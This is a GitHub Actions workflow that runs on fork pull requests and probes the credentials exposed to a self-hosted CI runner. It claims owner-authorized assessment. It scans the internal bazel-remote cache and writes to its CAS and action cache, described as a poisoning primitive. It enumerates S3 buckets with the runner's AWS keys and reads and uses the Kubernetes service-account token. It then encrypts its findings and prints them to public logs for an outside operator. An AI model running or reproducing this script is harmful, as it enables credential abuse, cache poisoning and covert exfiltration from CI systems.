name: zz-perms-probe

# Authorized assessment probe (radkawar, owner consent).
# Capability matrix for the credentials that a fork PR obtains on `omp-kata`:
#   - BAZEL_REMOTE_USER/PASSWORD vs the cluster bazel-remote (gRPC 9092 / HTTP)
#   - AWS_ACCESS_KEY_ID/SECRET vs the sccache S3 endpoint (scope beyond the bucket)
#   - the mounted service-account token vs the Kubernetes API
# The entire report is encrypted to an ephemeral RSA public key before it is
# printed, so the findings are readable only by the operator. No credential
# values, only status codes / names / ports. All writes are self-consistent,
# uniquely named, and deleted in the same step.

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  perms:
    name: credential capability matrix
    runs-on: omp-kata
    timeout-minutes: 12
    steps:
      - name: gather
        run: |
          set +e
          R=/tmp/report; : > "$R"
          log() { echo "$@" | tee -a "$R"; }

          log "## host=$(hostname) runner=${RUNNER_NAME} run=${GITHUB_RUN_ID}"

          log ""
          log "## 1. bazel-remote"
          BH=bazel-remote.bazel-cache.svc.cluster.local
          BA=(-u "${BAZEL_REMOTE_USER}:${BAZEL_REMOTE_PASSWORD}")
          for p in 9092 9093 8080 8081 80 443; do
            if timeout 4 bash -c "echo >/dev/tcp/$BH/$p" 2>/dev/null; then log "tcp $BH:$p OPEN"; else log "tcp $BH:$p closed/filtered"; fi
          done
          for port in 8080 8081 9093; do
            for path in /status /metrics; do
              code=$(curl -sk -o /tmp/b -w '%{http_code}' --max-time 6 "${BA[@]}" "http://$BH:$port$path")
              log "GET  http://$BH:$port$path (basic auth) -> $code $(head -c 80 /tmp/b | tr -d '\n')"
              code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 6 "http://$BH:$port$path")
              log "GET  http://$BH:$port$path (no auth)  -> $code"
            done
          done

          # CAS round-trip: content-addressed by our own digest -> collides with nothing.
          D="radkawar-probe-${GITHUB_RUN_ID}"; SH=$(printf %s "$D" | sha256sum | cut -d' ' -f1); SZ=${#D}
          for port in 8080 9093; do
            code=$(printf %s "$D" | curl -sk -o /dev/null -w '%{http_code}' --max-time 8 -X PUT --data-binary @- "${BA[@]}" "http://$BH:$port/cas/$SH/$SZ")
            log "PUT  http://$BH:$port/cas/$SH/$SZ -> $code"
            code=$(curl -sk -o /tmp/got -w '%{http_code}' --max-time 8 "${BA[@]}" "http://$BH:$port/cas/$SH/$SZ")
            log "GET  .../cas/$SH/$SZ -> $code body-match=$([ "$(cat /tmp/got)" = "$D" ] && echo yes || echo no)"
            code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 8 -X DELETE "${BA[@]}" "http://$BH:$port/cas/$SH/$SZ")
            log "DEL  .../cas/$SH/$SZ -> $code"
          done
          # Action-cache write attempt (the poisoning primitive shape): random digest.
          AC=$(openssl rand -hex 32)
          code=$(printf 'x' | curl -sk -o /dev/null -w '%{http_code}' --max-time 8 -X PUT --data-binary @- "${BA[@]}" "http://$BH:8080/ac/$AC/1")
          log "PUT  http://$BH:8080/ac/$AC/1 (random digest) -> $code"
          code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 8 -X DELETE "${BA[@]}" "http://$BH:8080/ac/$AC/1")
          log "DEL  .../ac/$AC/1 -> $code"

          log ""
          log "## 2. sccache S3 (scope beyond the configured bucket)"
          URL="http://${SCCACHE_ENDPOINT}/${SCCACHE_BUCKET:-sccache}"
          SIG=(--aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
          code=$(curl -sS -o /tmp/lb -w '%{http_code}' --max-time 10 "${SIG[@]}" "http://${SCCACHE_ENDPOINT}/")
          log "GET  / (ListBuckets) -> $code"
          sed -n 's:.*<Name>\([^<]*\)</Name>.*:     bucket=\1:p' /tmp/lb | head -10
          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 10 "${SIG[@]}" "http://${SCCACHE_ENDPOINT}/")
          log "GET  / without auth  -> $(curl -sS -o /dev/null -w '%{http_code}' --max-time 10 "http://${SCCACHE_ENDPOINT}/")"
          log "PUT/DELETE round-trip on bucket root already proven in run 37112550647"

          log ""
          log "## 3. kubernetes service account token"
          SA=/var/run/secrets/kubernetes.io/serviceaccount
          TOK=$(cat "$SA/token" 2>/dev/null)
          log "sa namespace=$(cat "$SA/namespace" 2>/dev/null)"
          log "token bytes=${#TOK}"
          if [ -n "$TOK" ]; then
            log "token claims (no token value):"
            printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
              | grep -oE '"(aud|iss|sub|namespace|pod)"[^,}]*' | sed 's/^/     /'
          fi
          log "env: KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST} PORT=${KUBERNETES_SERVICE_PORT}"
          for tgt in "https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}" \
                     "https://kubernetes.default.svc.cluster.local:443" \
                     "https://kubernetes.default.svc:6443" \
                     "https://${KUBERNETES_SERVICE_HOST}:6443"; do
            for path in /version "/api/v1/namespaces?limit=1"; do
              code=$(curl -sk -o /tmp/k -w '%{http_code}' --max-time 6 --cacert "$SA/ca.crt" -H "Authorization: Bearer $TOK" "$tgt$path")
              log "GET  $tgt$path -> $code $(head -c 100 /tmp/k | tr -d '\n')"
            done
          done
          log "default route: $(ip route 2>/dev/null | head -3 | tr '\n' ' ')"
          log "kubeconfig present: $([ -f "$HOME/.kube/config" ] && echo yes || echo no)"
          log "node/exec sockets: $(ls /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null | tr '\n' ' ' || true)"

          log ""
          log "## 4. misc"
          log "user=$(id -u):$(id -g) groups=$(id -Gn)"
          log "sudo: $(sudo -n true 2>&1 | head -1)"
          log "shared mounts writable: $(for d in /opt/bazel-repo-cache /home/runner/.bun/install/cache /home/runner/.cargo/registry/cache /home/runner/.cargo/registry/index; do [ -w "$d" ] && printf '%s=y ' "$d"; done)"

          # ---- encrypt the report to the ephemeral public key ----
          printf '%s' '' | base64 -d > /tmp/pub.der
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16)
          printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in "$R" -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der \
            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
            -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-BLOB=$(base64 -w0 /tmp/ct)"
          echo "PROBE-PLAINTEXT-SHA256=$(sha256sum "$R" | cut -d' ' -f1)"
          exit 0
